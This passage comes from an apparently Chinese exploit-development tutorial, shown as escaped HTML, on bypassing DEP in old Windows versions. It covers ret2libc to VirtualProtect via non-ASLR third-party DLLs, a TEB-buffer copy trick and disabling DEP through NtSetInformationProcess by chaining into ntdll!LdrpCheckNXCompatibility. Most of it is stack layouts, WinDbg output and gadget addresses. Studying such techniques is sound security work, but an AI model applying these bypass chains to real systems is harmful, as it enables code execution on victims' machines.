┃内存低地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┗━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━┛&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由于后期系统dll加入了ASDL保护，因此我们可以选用未开启ASLR的第三方DLL文件，示例如下（这里使用迅雷IE插件）：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;XunleiBHO7.1.6.2194.dll(DEP/ NO ASLR)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:211D18F5                 call    ds:VirtualProtect&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:211D18FB                 pop     esi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:211D18FC                 pop     ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:211D18FD                 retn    0Ch&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;栈空间布局：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;41414141  垃圾字节（共3088字节）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;……&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;211D18F5  返回地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41414141  平衡堆栈（视漏洞函数的具体情况而定）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;07c50000  lpAddress(shellcode地址)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;00001000  dwSize&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;00000040  flNewProtect (PAGE_EXECUTE_READWRITE)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;07c50020  lpflOldProtect (可写地址)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41414141  平衡 pop esi 使用的堆栈&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41414141  平衡 pop ebp 使用的堆栈&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;07c50000  返回地址，指向shellcode&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在一次实际利用中，我使用了COMODO主动防御软件中的guard32.dll来定位VirtualProtect函数：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;#1002CA33  -FF25 E8F30310    JMP DWORD PTR DS:[1003F3E8]  [Module : guard32.dll]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# jmp to here&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#6FFF04C0   8BFF             MOV EDI,EDI&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#6FFF04C2   55               PUSH EBP&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#6FFF04C3   8BEC             MOV EBP,ESP&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#6FFF04C5  -E9 E64BFF06      JMP kernel32.76FE50B0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# jmp to here&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#76FE50B0   5D               POP EBP&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#76FE50B1  ^E9 02D0FBFF      JMP &amp;lt;JMP.&amp;amp;API-MS-Win-Core-Memory-L1-1-0.VirtualProtect&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# jmp to here&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#76FA20B8  -FF25 1019FA76    JMP DWORD PTR DS:[&amp;lt;&amp;amp;API-MS-Win-Core-Memory-L1-1-0.VirtualProtect&amp;gt;; KERNELBA.VirtualProtect&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;关于ret2lib技术的更多信息可参考资料：&lt;a href=&quot;http://www.infosecwriters.com/text_resources/pdf/return-to-libc.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.infosecwriters.com/text_resources/pdf/return-to-libc.pdf&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;2-利用TEB突破DEP&quot;&gt;&lt;a href=&quot;#2-利用TEB突破DEP&quot; class=&quot;headerlink&quot; title=&quot;2.利用TEB突破DEP&quot;&gt;&lt;/a&gt;2.利用TEB突破DEP&lt;/h4&gt;&lt;p&gt;在之前的《黑客防线》中有篇文章《SP2下利用TEB执行ShellCode》，有兴趣的读者可以翻看黑防出版的《缓冲区溢出攻击与防范专辑》，上面有这篇文章。该作者在文中提到一种利用TEB（线程环境块）来突破DEP的方法，不过它受系统版本限制，只能在XP sp2及其以下版本的windows系统上使用，因为更高版本的系统，其TEB地址是不固定的，每次都是动态生成的。该方法的具体实现方法如下：&lt;br&gt;（1）将返回地址覆盖成字符串复制函数的地址，比如lstrcpy，memcpy等等；&lt;br&gt;（2）在返回地址之后用目标内存地址和shellcode地址覆盖，当执行复制操作时，就会将shellcode复制到目标内存地址，该目标内存地址位于TEB偏移0xC00的地方，它有520字节缓存用于ANSI-to-Unicode函数的转换；&lt;br&gt;（3）复制操作结束后返回到shellcode地址并执行它。&lt;br&gt;此时其堆栈布局如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;┏━━━━━━━┓&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【shellcode 】&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【save ebp  】&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【lstrcpy 】&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【TEB缓存地址 】&amp;lt;= 用于复制结束后返回到shellcode&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【TEB缓存地址 】&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【ShellCode地址 】&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┗━━━━━━━┛&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;3-利用NtSetInformationProcess关闭DEP&quot;&gt;&lt;a href=&quot;#3-利用NtSetInformationProcess关闭DEP&quot; class=&quot;headerlink&quot; title=&quot;3.利用NtSetInformationProcess关闭DEP&quot;&gt;&lt;/a&gt;3.利用NtSetInformationProcess关闭DEP&lt;/h4&gt;&lt;p&gt;关于此方法最原始的资料应该是黑客杂志《uninformed》上的文章&lt;a href=&quot;http://www.uninformed.org/?v=2&amp;amp;a=4&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《Bypassing Windows Hardware-enforced Data Execution Prevention》&lt;/a&gt;，另外也可以看下本人之前翻译的&lt;a href=&quot;http://bbs.pediy.com/showthread.php?t=99045&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《突破win2003 sp2中基于硬件的DEP》&lt;/a&gt;，此方法的主要原理就是利用NtSetInformationProcess()函数来设置KPROCESS 结构中的相关标志位，进而关闭DEP，KPROCESS结构中相关标志位情况如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;000&lt;/span&gt;&amp;gt; dt nt!_KPROCESS -r&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ntdll!_KPROCESS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;. . .&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+&lt;span class=&quot;number&quot;&gt;0x06b&lt;/span&gt; Flags      : _KEXECUTE_OPTIONS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        +&lt;span class=&quot;number&quot;&gt;0x000&lt;/span&gt; ExecuteDisable     : Pos &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; Bit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        +&lt;span class=&quot;number&quot;&gt;0x000&lt;/span&gt; ExecuteEnable    : Pos &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; Bit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        +&lt;span class=&quot;number&quot;&gt;0x000&lt;/span&gt; DisableThunkEmulation  : Pos &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; Bit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        +&lt;span class=&quot;number&quot;&gt;0x000&lt;/span&gt; Permanent    : Pos &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; Bit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        +&lt;span class=&quot;number&quot;&gt;0x000&lt;/span&gt; ExecuteDispatchEnable  : Pos &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; Bit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        +&lt;span class=&quot;number&quot;&gt;0x000&lt;/span&gt; ImageDispatchEnable  : Pos &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; Bit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        +&lt;span class=&quot;number&quot;&gt;0x000&lt;/span&gt; Spare      : Pos &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; Bits&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当DEP 被启用时，ExecuteDisable 被置位，当DEP 被禁用，ExecuteEnable 被置位，当Permanent 标志置位时表示这些设置是最终设置，不可更改。代码实现：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;NtSetInformationProcess(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        NtCurrentProcess(),   &lt;span class=&quot;comment&quot;&gt;// ProcessHandle = -1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ProcessExecuteFlags,  &lt;span class=&quot;comment&quot;&gt;// ProcessInformationClass = 0x22（ProcessExecuteFlags）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;amp;ExecuteFlags,    &lt;span class=&quot;comment&quot;&gt;// ProcessInformation = 0x2（MEM_EXECUTE_OPTION_ENABLE）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(ExecuteFlags));  &lt;span class=&quot;comment&quot;&gt;// ProcessInformationLength = 0x4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;具体实现思路（以我电脑上VirtualBox虚拟机下的xp sp3为例）：&lt;br&gt;1) 将al设置为1，比如指令mov al,1 / ret，然后用该指令地址覆盖返回地址：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; lmm ntdll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;start    end        module name&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c920000 7c9b3000   ntdll      (pdb symbols)          c:\symbollocal\ntdll.pdb\1751003260CA42598C0FB326585000ED2\ntdll.pdb&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; s 7c920000 l 93000 b0 01 c2 04&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c9718ea  b0 01 c2 04 00 90 90 90-90 90 8b ff 55 8b ec 56  ............U..V&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; u 7c9718ea&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ntdll!NtdllOkayToLockRoutine:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c9718ea b001            mov     al,1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c9718ec c20400          ret     4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由于上面的ret 4，因此要再向栈中填充4字节（比如0xffffffff）以抵消多弹出的4字节，如果选择的指令刚好是ret则无须再多填充4字节。&lt;/p&gt;
&lt;p&gt;2) 跳转到ntdll!LdrpCheckNXCompatibility中的部分代码（从cmp al,1 开始，可通过windbg下的命令uf ntdll!LdrpCheckNXCompatibility来查看其反汇编代码），比如以下地址就需要用0x7c93cd24来覆写堆栈上的第二个地址：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ntdll!LdrpCheckNXCompatibility+0x13:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c93cd24 3c01            cmp     al,1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c93cd26 6a02            push    2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c93cd28 5e              pop     esi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c93cd29 0f84df290200    je      ntdll!LdrpCheckNXCompatibility+0x1a (7c95f70e)  ; 之前已将al置1，故此处实现跳转&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;3) 上面跳转后来到这里：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; u 7c95f70e&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ntdll!LdrpCheckNXCompatibility+0x1a:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c95f70e 8975fc          mov     dword ptr [ebp-4],esi  ; [ebp-0x4]= esi = 2     &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;;执行到这里的时候会发现ebp-4(41414141-4 = 4141413d)而导致不可写，因此我们需要在前面调整下ebp的值，比如可以使用以下指令：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;;- push esp / pop ebp / ret&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;;- mov esp,ebp / ret&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;;或者其它可调整ebp为可写地址的指令&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c95f711 e919d6fdff      jmp     ntdll!LdrpCheckNXCompatibility+0x1d (7c93cd2f)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;4) 上面跳转后来到：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; u 7c93cd2f&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ntdll!LdrpCheckNXCompatibility+0x1d:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c93cd2f 837dfc00        cmp     dword ptr [ebp-4],0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c93cd33 0f85f89a0100    jne     ntdll!LdrpCheckNXCompatibility+0x4d (7c956831) ; 由于不相等再次实现跳转&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;5) 上面跳转后来到：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; u 7c956831&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ntdll!LdrpCheckNXCompatibility+0x4d:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c956831 6a04            push    4    ;ProcessInformationLength = 4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c956833 8d45fc          lea     eax,[ebp-4]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c956836 50              push    eax      ;ProcessInformation = 2（MEM_EXECUTE_OPTION_ENABLE）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c956837 6a22            push    22h      ;ProcessInformationClass = 0x22（ProcessExecuteFlags）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c956839 6aff            push    0FFFFFFFFh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c95683b e84074fdff      call    ntdll!ZwSetInformationProcess (7c92dc80)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c956840 e92865feff      jmp     ntdll!LdrpCheckNXCompatibility+0x5c (7c93cd6d)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c956845 90              nop&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在这里调用函数ZwSetInformationProcess（），而其参数也刚好达到我们关闭DEP的各项要求.&lt;/p&gt;
&lt;p&gt;6) 最后跳转到函数结尾：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; u 7c93cd6d&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ntdll!LdrpCheckNXCompatibility+0x5c:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c93cd6d 5e              pop     